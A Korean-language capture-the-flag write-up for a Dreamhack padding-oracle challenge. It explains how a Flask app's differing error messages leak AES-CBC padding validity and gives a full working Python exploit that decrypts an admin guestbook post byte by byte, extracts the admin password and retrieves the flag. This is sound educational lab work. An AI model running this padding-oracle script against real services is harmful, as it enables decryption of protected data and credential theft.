dreamhack Padding Oracle writeup
===============

 ## 1. 코드 분석

 일단 문제의 키워드인 '패딩 오라클'에 집중하면서 주어진 코드를 살펴본다.

 ```python
try:
    data = json.loads(AESCrypto().decrypt(base64.b64decode(e_data))...)
    # ... 중략 ...
except json.decoder.JSONDecodeError as e:
    return jsonify({"status": "error", "result": {"message": "JSONDecodeError"}})
except UnicodeDecodeError:
    return jsonify({"status": "error", "result": {"message": "UnicodeDecodeError"}})
except ValueError as e:
    return jsonify({"status": "error", "result": {"message": "ValueError"}})
```

이 함수 내의 `try-except` 블록이 **Oracle** 역할을 한다.


* 오라클 발생 지점: AES-CBC 모드 등에서 복호화를 수행할 때 패딩이 올바르지 않으면 암호화 라이브러리는 보통 `ValueError`를 발생시킴
* 정보 유출: 서버는 사용자가 보낸 `e_data`의 패딩이 틀리면 `"ValueError"`, 패딩은 맞지만 JSON 형식이 아니면 `"JSONDecodeError"`를 반환
* 공격자의 판단: 공격자는 이 두 응답의 차이를 보고 자신이 조작한 암호문의 **마지막 바이트 패딩이 성공했는지 실패했는지**를 확신할 수 있다.



## 2. 공격 시나리오 (목표: `admin_password` 탈취)


```python
@app.route("/secure/secret")
def secure_secret():
    password = request.args.get("password", None)

    if password is None:
        return jsonify({"status": "error", "result": None})

    if password == admin_password:
        return jsonify(
            {
                "status": "success",
                "result": {"secret": gGuestBook.getFileContents("flag.txt", "r", 44)},
            }
        )

    return jsonify({"status": "error", "result": {"message": "password is incorrect"}})


if __name__ == "__main__":
    Setup()
    gGuestBook = GuestBook()
    admin_password = gGuestBook.getFileContents("password.txt", "r", 8)
    gGuestBook.saveGuestBook(
        "admin",
        "Admin Password",
        f"The password is: {admin_password}".encode("latin-1"),
    )
    gGuestBook.saveGuestBook("guest", "Hello", b"World")
    app.run(host="0.0.0.0", port=80)
```


코드 하단을 보면 `admin_password`가 파일에서 읽혀 admin이 작성한 게시물 `GuestBook`에 저장되고 있다.

1. 게시물 식별: `/gb/` 목록 조회를 통해 `Admin Password` 게시물의 인덱스(idx)를 찾sms다.
2. 암호문 획득: 해당 게시물의 데이터는 암호화되어 있을 것이다. 공격자는 이 암호문(C)을 가지고 `/secure/decrypt` 조정
3. 복호화 (Padding Oracle):
* 암호문의 앞 블록()의 바이트를 하나씩 조작해 서버에 전송
* 서버가 `"ValueError"`가 아닌 `"JSONDecodeError"`를 반환할 때까지 값을 바꾼다. 
* `JSONDecodeError`가 떴다는 것은 **"내용은 깨졌지만 패딩은 올바르다"** 는 뜻
* 이 성질과 CBC 모드의 연쇄 법칙을 이용해 실제 평문을 한 바이트씩 알아낸다.


4. 비밀번호 획득: 복호화된 결과에서 `admin_password`를 알아낸다.
5. 최종 단계: 알아낸 패스워드로 `/secure/secret?password=...`를 호출, `flag.txt`의 내용을 획득한다. 



## 3. 익스플로잇 코드

```python
import base64
import requests
from urllib import parse

# 1. 설정
API_URL = "http://host3.dreamhack.games:8843/"
BLOCK_SIZE = 16

def is_padding_ok(enc_data_b64):
    # 서버에 조작된 암호문을 보내 패딩이 올바른지 확인하는 오라클 함수
    # token과 sig는 형식을 맞추기 위한 임의의 값
    # e_data가 먼저 복호화되므로 e_data의 패딩 오류 여부를 먼저 알 수 있다.
    dummy_token = base64.b64encode(b'{"user_id":"guest","group":"user"}').decode()
    
    params = {
        'e_data': enc_data_b64,
        'token': dummy_token,
        'sig': 'abc'
    }
    
    try:
        response = requests.get(f"{API_URL}secure/decrypt", params=params).json()
        # 결과 메시지가 'ValueError'가 아니면(JSONDecodeError 등) 패딩은 일단 맞았다는 뜻
        return response.get('result', {}).get('message') != 'ValueError'
    except:
        return False

def decrypt_block(target_block, prev_block):
    # CBC 모드의 특성을 이용해 한 블록(16바이트)을 복호화
    intermediate = bytearray(BLOCK_SIZE)
    plain_text = bytearray(BLOCK_SIZE)
    
    # 뒤에서부터 한 바이트씩 공격 (16번째 바이트 -> 1번째 바이트)
    for i in range(1, BLOCK_SIZE + 1):
        padding_val = i
        modified_prev = bytearray(prev_block)
        
        # 이미 찾아낸 뒷부분 중간값들을 현재 패딩 값(i)에 맞춰 조작
        for j in range(1, i):
            modified_prev[BLOCK_SIZE - j] = intermediate[BLOCK_SIZE - j] ^ padding_val
            
        found = False
        # 0부터 255까지 대입하여 패딩이 맞는지 확인
        for val in range(256):
            modified_prev[BLOCK_SIZE - i] = val
            test_enc = base64.b64encode(bytes(modified_prev) + target_block).decode()
            
            if is_padding_ok(test_enc):
                intermediate[BLOCK_SIZE - i] = val ^ padding_val
                plain_text[BLOCK_SIZE - i] = intermediate[BLOCK_SIZE - i] ^ prev_block[BLOCK_SIZE - i]
                current_char = chr(plain_text[BLOCK_SIZE - i]) if 32 <= plain_text[BLOCK_SIZE - i] <= 126 else '?'
                print(f"[+] Found Byte {BLOCK_SIZE-i:02d}: {hex(plain_text[BLOCK_SIZE-i])} ('{current_char}')")
                found = True
                break
        
        if not found:
            print(f"[-] Failed to find byte at index {BLOCK_SIZE - i}")
            
    return plain_text

def main():
    # 2. 게시물 목록에서 Admin 게시물 찾기 (Unpacking 에러 해결)
    print(f"[*] Connecting to {API_URL}...")
    try:
        list_res = requests.get(f"{API_URL}gb/").json()
    except Exception as e:
        print(f"[-] Connection Error: {e}")
        return

    articles = list_res.get('result', {}).get('articles', [])
    target_idx = None
    
    for article in articles:
        if isinstance(article, dict):
            idx = article.get('idx')
            title = article.get('title', '')
        else:
            idx, title = article[0], article[1]
            
        if "Admin" in str(title):
            target_idx = idx
            print(f"[+] Found Admin article at index: {target_idx}")
            break
            
    if target_idx is None:
        print("[-] Could not find Admin article.")
        return

    # 3. 암호화된 데이터 획득
    article_res = requests.get(f"{API_URL}gb/{target_idx}").json()
    enc_data_b64 = article_res['result']['article']['enc_data']
    enc_data = base64.b64decode(enc_data_b64)
    
    # 4. 블록 단위 복호화
    blocks = [enc_data[i:i+BLOCK_SIZE] for i in range(0, len(enc_data), BLOCK_SIZE)]
    full_plain_text = b""
    
    # CBC이므로 (이전블록, 현재블록) 쌍으로 복호화 진행
    for i in range(1, len(blocks)):
        print(f"[*] Decrypting Block {i}...")
        full_plain_text += decrypt_block(blocks[i], blocks[i-1])
        
    print(f"\n[!] Final Decrypted Text: {full_plain_text}")

    # 5. 패스워드 추출 및 플래그 획득
    try:
        decoded_text = full_plain_text.decode('latin-1', errors='ignore')
        if "password is: " in decoded_text:
            admin_pw = decoded_text.split("password is: ")[1].split('"')[0].strip()
            admin_pw = admin_pw.replace('}', '').replace(' ', '')
            print(f"[*] Extracted Password: {admin_pw}")
            
            final_res = requests.get(f"{API_URL}secure/secret", params={'password': admin_pw}).json()
            print("-" * 40)
            print(f"FLAG: {final_res.get('result', {}).get('secret')}")
            print("-" * 40)
    except Exception as e:
        print(f"[-] Parsing failed: {e}")

if __name__ == "__main__":
    main()
```



## 4. 실행 결과



<img width="1147" height="126" alt="image" src="https://github.com/user-attachments/assets/98b1659f-8969-4fa7-be5f-a9c80578f848" />

이렇게 플래그를 얻어낼 수 있다.
